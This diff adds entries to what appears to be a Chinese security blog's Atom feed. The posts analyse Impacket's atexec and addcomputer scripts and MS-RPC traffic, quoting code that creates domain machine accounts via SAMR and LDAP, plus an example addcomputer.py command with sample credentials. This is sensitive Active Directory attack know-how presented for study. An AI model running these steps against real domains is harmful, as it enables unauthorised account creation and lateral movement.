+smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)
+dce.disconnect()
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="4"><img src="https://iceberg-n.github.io/post-images/1699789582972.png" alt="" loading="lazy"></figure>
+<p>整理代码思维导图如下：</p>
+<figure data-type="image" tabindex="5"><img src="https://iceberg-n.github.io/post-images/1699789587664.png" alt="" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>本此浅析impacket中atexec脚本的整个流程，该脚本通过目标主机上计划任务组件进行命令执行，如果SMB版本位2.1之后，则SMB为加密流量，所以我们以WIN7系统主机做测试可以看到SMB通信详细信息；</p>
+<p>整理流程图如下：</p>
+<figure data-type="image" tabindex="6"><img src="https://iceberg-n.github.io/post-images/1699789592104.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[impacket解读 -- addcomputer浅析]]></title>
+        <id>https://iceberg-n.github.io/post/impacket-jie-du-addcomputer-qian-xi/</id>
+        <link href="https://iceberg-n.github.io/post/impacket-jie-du-addcomputer-qian-xi/">
+        </link>
+        <updated>2023-11-10T03:47:29.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="addcomputer-浅析">addcomputer 浅析</h1>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="addcomputer-浅析">addcomputer 浅析</h1>
+<!-- more -->
+<p>作用：域内创建机器账户；</p>
+<p>方法：samr(默认)、ldap；</p>
+<h2 id="samr">SAMR</h2>
+<h3 id="rpc绑定">RPC绑定</h3>
+<p>​		epm.hept_map()方法进行前期的RPC绑定以及EPM MAP请求操作</p>
+<pre><code class="language-python">if self.__targetIp is not None:
+            stringBinding = epm.hept_map(self.__targetIp, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
+        else:
+            stringBinding = epm.hept_map(self.__target, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
+</code></pre>
+<p>​		此段代码对应的流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699588107180.png" alt="" loading="lazy"></p>
+<p>配置samr协议通信要用到的参数，samr服务器地址、端口、凭据等；</p>
+<pre><code class="language-python"> rpctransport = transport.DCERPCTransportFactory(stringBinding)
+        rpctransport.set_dport(self.__port)
+
+        if self.__targetIp is not None:
+            rpctransport.setRemoteHost(self.__targetIp)
+            rpctransport.setRemoteName(self.__target)
+
+        if hasattr(rpctransport, 'set_credentials'):
+            # This method exists only for selected protocol sequences.
+            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
+                                         self.__nthash, self.__aesKey)
+
+        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+</code></pre>
+<h3 id="rpc调用">RPC调用</h3>
+<p>​		doSAMRAdd()方法进行创建创建用户</p>
+<pre><code class="language-python">self.doSAMRAdd(rpctransport)
+</code></pre>
+<p>​		对应的流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699588124358.png" alt="" loading="lazy"></p>
+<p>​	进入doSAMRAdd()方法中，以下是创建机器账户的大体流程：</p>
+<ul>
+<li>
+<p>dce = rpctransport.get_dce_rpc() //创建DCE/RPC实例</p>
+</li>
+<li>
+<p>dce.connect()  //与目标建立smb连接</p>
+</li>
+<li>
+<p>dec.bind(samr.MSRPC_UUID_SAMR)  //绑定到目标samr接口</p>
+<p>此处代码对应的流量：<br>
+<img src="https://iceberg-n.github.io/post-images/1699588130939.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>samr.hSamrConnect5()  //连接samr服务器</p>
+</li>
+<li>
+<p>samr.hSamrEnumerateDomainsInSamServer()  //枚举目标服务器上的域</p>
+</li>
+<li>
+<p>samr.hSamrLookupDomainInSamServer()  //检索目标域名对应的SID</p>
+</li>
+<li>
+<p>samr.hSamrOpenDomain()  //获取samr服务器中目标域的句柄</p>
+</li>
+<li>
+<p>samr.hSamrCreateUser2InDomain()  //创建机器账户</p>
+</li>
+<li>
+<p>samr.hSamrSetPasswordInternal4New()  //设置机器账户密码</p>
+<p>上面的通信是经过SMBV3加密的，所以流量上看不出什么；</p>
+</li>
+</ul>
+<h2 id="ldap">LDAP</h2>
+<p>​		因为ldap3通信使用了SSL加密，抓包看不出明显特征，就不放流量图了，如果想看不加密可以将ldap3.Server()方法中的use_ssl设置为False，后面的文章会详细分析ldap通信；</p>
+<p>​		ldap3.Server()方法配置ldap服务器ip、端口、是否使用ssl加密等信息；</p>
+<pre><code>ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
+</code></pre>
+<p>​		ldap3.Connection()方法进行认证，默认为NTLM认证，也可以使用Kerberos或hash认证；</p>
+<pre><code>if self.__doKerberos:
+                    ldapConn = ldap3.Connection(ldapServer)
+                    self.LDAP3KerberosLogin(ldapConn, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                                 self.__aesKey, kdcHost=self.__kdcHost)
+                elif self.__hashes is not None:
+                    ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
+                    ldapConn.bind()
+                else:
+                    ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
+                    ldapConn.bind()
+</code></pre>
+<p>​		在目标ldap数据库中添加咱们创建的机器账户的各种属性，dnsHostName、userAccountControl、servicePrincipalName、unicodePwd等；</p>
+<pre><code>computerHostname = self.__computerName[:-1]
+                computerDn = ('CN=%s,%s' % (computerHostname, self.__computerGroup))
+
+                # Default computer SPNs
+                spns = [
+                    'HOST/%s' % computerHostname,
+                    'HOST/%s.%s' % (computerHostname, self.__domain),
+                    'RestrictedKrbHost/%s' % computerHostname,
+                    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
+                ]
+                ucd = {
+                    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
+                    'userAccountControl': 0x1000,
+                    'servicePrincipalName': spns,
+                    'sAMAccountName': self.__computerName,
+                    'unicodePwd': ('&quot;%s&quot;' % self.__computerPassword).encode('utf-16-le')
+                }
+
+                res = ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>​		本次对impacket中的addcomputer脚本进行浅析，只是解释了关键步骤的代码；</p>
+<p>​		samr方法是通过samr协议对lsass.exe进行请求创建机器账户，并存储到ntds.dit数据库中；</p>
+<p>​		ldap方法是向域控的ldap数据库建立连接，在ldap中添加机器账户以及相关属性；</p>
+<p>将上面代码绘制成导图，方便理解；<br>
+<img src="https://iceberg-n.github.io/post-images/1699588251206.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[MS-RPC -- RPC基础知识]]></title>
+        <id>https://iceberg-n.github.io/post/rpc/</id>
+        <link href="https://iceberg-n.github.io/post/rpc/">
+        </link>
+        <updated>2023-11-05T03:11:50.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="rpc-基础知识">RPC 基础知识</h1>
+<hr>
+<h2 id="建立rpc服务">建立RPC服务</h2>
+<p>​		当建立RPC Server时，会向EPM服务器注册相关信息，这些信息会存储在epm服务器的端点映射数据库中，rpc发现过程中也是查询端点映射数据库中的信息返回给client；</p>
+<p>​		一般每个windows都会有rpc服务以及epm，如果不是域内，只是本地进行rpc通信，会向目标主机上的epm进行epm map(映射)请求；</p>
+<p>常见注册信息如下：</p>
+<ul>
+<li>
+<p>服务uuid(通用唯一标识符)；</p>
+</li>
+<li>
+<p>服务ip及开放的端口；</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://iceberg-n.github.io/post-images/1699153992859.png" alt="" loading="lazy"></figure>
+<h2 id="rpc通信的四个阶段">RPC通信的四个阶段</h2>
+<p>​	以impacket中的addcomputer.py进行举例，该脚本是在域内注册机器账号，wireshare抓包如下：</p>
+<figure data-type="image" tabindex="2"><img src="https://iceberg-n.github.io/post-images/1699154012905.png" alt="" loading="lazy"></figure>
+<p>相关命令：</p>
+<pre><code>python addcomputer.py domain.local/win10_admin:Admin@123 -dc-ip 192.168.1.128
+
+//domain.local/win10_admin:Admin@123为域用户凭证
+//192.168.1.128为域控制器ip
+</code></pre>
+<h3 id="第一阶段建立tcp通信">第一阶段：建立TCP通信</h3>
+<p>​		TCP会话建立是在RPC客户端和RPC服务器之间建立TCP连接的行为。TCP 会话将由 RPC 客户端通过与 RPC 服务器的 TCP 3 次握手来启动。</p>
+<figure data-type="image" tabindex="3"><img src="https://iceberg-n.github.io/post-images/1699154019336.png" alt="" loading="lazy"></figure>
+<h3 id="第二阶段rpc绑定">第二阶段：RPC绑定</h3>
+<p>​		client向server发送RPC绑定请求，其中包括rpc通信所使用的通信协议、版本等；</p>
+<p>​		server向client返回响应，其中包括rpc通信id、数据分片形式、传输最大值、是否同意进行通信等；</p>
+<h5 id="通信协议">通信协议</h5>
+<p>​		client选择通信协议向server建立连接，这些协议都是基于tcp协议，协议如下：</p>
+<table>
+<thead>
+<tr>
+<th>传输协议</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ncacn_np</td>
+<td>smb协议，通常使用命名管道(Named Pipes)进行通信，默认端口445</td>
+</tr>
+<tr>
+<td>ncacn_tcp</td>
+<td>tcp协议，默认端口135</td>
+</tr>
+<tr>
+<td>ncacn_nb</td>
+<td>netbios协议，默认端口139</td>
+</tr>
+<tr>
+<td>ncacn_http</td>
+<td>http协议，默认端口80、443</td>
+</tr>
+</tbody>
+</table>
+<figure data-type="image" tabindex="4"><img src="https://iceberg-n.github.io/post-images/1699154025395.png" alt="" loading="lazy"></figure>
+<h3 id="第三阶段rpc发现及查询">第三阶段：RPC发现及查询</h3>
+<p>​		如果在不知道rpc服务器的ip及端口，则RPC发现要放在第一阶段，通过epm map请求epm来获取rpc服务端的信息，再进行rpc绑定和通信；</p>
+<h4 id="epm-map映射请求">EPM MAP(映射)请求</h4>
+<p>​		client向epm发送map请求也叫做映射请求，其中包括rpc服务器的ip地址等信息；</p>
+<p>​		epm向client发送map 响应，其中包括rpc服务器的host和端口，如果是smb协议会返回Named Pipe等信息；</p>
+<figure data-type="image" tabindex="5"><img src="https://iceberg-n.github.io/post-images/1699154029786.png" alt="" loading="lazy"></figure>
+<h4 id="tcp-通信结束">TCP 通信结束</h4>
+<p>经历了rpc的绑定后，tcp进行四次挥手断开；</p>
+<figure data-type="image" tabindex="6"><img src="https://iceberg-n.github.io/post-images/1699154046623.png" alt="" loading="lazy"></figure>
+<h3 id="第四阶段rpc通信">第四阶段：RPC通信</h3>
+<p>​		重新开启tcp连接进行rpc通信，使用rpc绑定时的协议进行通信；</p>
+<p><img src="https://iceberg-n.github.io/post-images/1699154052227.png" alt="" loading="lazy"><br>
+​		进行smb认证通信</p>
+<p><img src="https://iceberg-n.github.io/post-images/1699154057382.png" alt="" loading="lazy"><br>
+​		smb通信结束后，server会向client发送rst tcp包进行强制断开连接；</p>
+<figure data-type="image" tabindex="7"><img src="https://iceberg-n.github.io/post-images/1699154060669.png" alt="" loading="lazy"></figure>
+<p>通过查看addcomputer的rpc过程，绘制流程图如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699154068875.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+</feed>
